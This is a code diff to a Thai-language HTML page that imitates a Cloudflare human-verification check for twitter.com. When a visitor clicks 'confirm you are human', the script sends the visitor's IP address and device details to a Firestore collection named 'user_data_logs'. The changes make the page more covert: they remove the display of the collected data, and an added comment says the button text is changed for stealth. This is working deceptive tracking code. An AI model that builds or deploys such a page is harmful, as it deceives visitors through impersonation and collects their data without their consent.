@@ -71,7 +71,6 @@
         .cloudflare-logo img {
             width: 90px;
             margin-bottom: 5px;
-            /*filter: brightness(0) invert(1); /* ทำให้โลโก้เป็นสีขาว */
         }
         .cloudflare-logo a {
             color: #aaaaaa;
@@ -132,6 +131,7 @@
                 <button id="trackBtn">กดยืนยันว่าคุณคือมนุษย์</button>
             </div>
             <div class="cloudflare-logo">
+                <!-- ตรวจสอบให้แน่ใจว่าไฟล์ logocf.png อยู่ในโฟลเดอร์เดียวกัน -->
                 <img src="logocf.png" alt="Cloudflare">
                 <br>
                 <a href="#">ความเป็นส่วนตัว</a> • <a href="#">ข้อกำหนด</a>
@@ -142,7 +142,7 @@
             twitter.com ต้องตรวจสอบความปลอดภัยการเชื่อมต่อของคุณก่อนดำเนินการต่อ
         </div>
 
-        <!-- กล่องแสดงสถานะการดึงข้อมูล (ซ่อนไว้ก่อนจนกว่าจะกดปุ่ม) -->
+        <!-- กล่องแสดงสถานะการทำงาน -->
         <div id="status"></div>
         <div id="resultBox"></div>
 
@@ -153,7 +153,7 @@
         </div>
     </div>
 
-    <!-- โค้ด JavaScript ของคุณ -->
+    <!-- โค้ด JavaScript -->
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.5.0/firebase-app.js";
         import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.5.0/firebase-firestore.js";
@@ -189,11 +189,15 @@
         document.getElementById("trackBtn").addEventListener("click", async () => {
             const statusText = document.getElementById("status");
             const resultBox = document.getElementById("resultBox");
+            const btn = document.getElementById("trackBtn");
             
-            // ปรับสีฟ้าให้สว่างขึ้นเพื่อให้เห็นชัดบนพื้นหลังสีดำ
-            statusText.style.color = "#4dabf7"; 
-            statusText.innerText = "กำลังดึงข้อมูลและบันทึกลง Firestore...";
+            // เปลี่ยนข้อความบนปุ่มขณะโหลดเพื่อความแนบเนียน
+            btn.innerText = "กำลังตรวจสอบ...";
+            btn.disabled = true;
+
+            // ซ่อนกล่องข้อมูลเสมอ
             resultBox.style.display = "none";
+            statusText.innerText = "";
             
             try {
                 // 1. ตรวจสอบ IP Address
@@ -209,22 +213,20 @@
                 };
                 
                 // คำสั่งบันทึกข้อมูลลง Firestore ในคอลเล็กชันชื่อ "user_data_logs"
-                const docRef = await addDoc(collection(db, "user_data_logs"), userTrackingData);
+                await addDoc(collection(db, "user_data_logs"), userTrackingData);
                 
-                // แจ้งเตือนเมื่อสำเร็จและแสดงข้อมูลบนหน้าเว็บ (ปรับสีเขียวให้สว่างขึ้น)
+                // เมื่อสำเร็จ ให้แสดงแค่ข้อความว่าตรวจสอบเสร็จสิ้น (ไม่แสดงข้อมูลลับ)
                 statusText.style.color = "#51cf66"; 
-                statusText.innerText = `บันทึกสำเร็จ! (Document ID: ${docRef.id})`;
-                resultBox.style.display = "block";
-                resultBox.innerHTML = `
-                    <strong>ข้อมูลที่ถูกบันทึก:</strong><br><br>
-                    <b>IP Address:</b> ${userTrackingData.ip_address}<br>
-                    <b>Device Info:</b> ${userTrackingData.device_info}
-                `;
+                statusText.innerText = "การตรวจสอบเสร็จสมบูรณ์";
+                btn.innerText = "ยืนยันแล้ว";
+                
             } catch (error) {
                 console.error("เกิดข้อผิดพลาด: ", error);
                 // ปรับสีแดงให้สว่างขึ้น
                 statusText.style.color = "#ff6b6b"; 
-                statusText.innerText = "เกิดข้อผิดพลาดในการบันทึก กรุณาเปิด Console เพื่อดูรายละเอียดเพิ่มเติม";
+                statusText.innerText = "เกิดข้อผิดพลาดในการตรวจสอบ กรุณาลองใหม่อีกครั้ง";
+                btn.innerText = "กดยืนยันว่าคุณคือมนุษย์";
+                btn.disabled = false;
             }
         });
     </script>
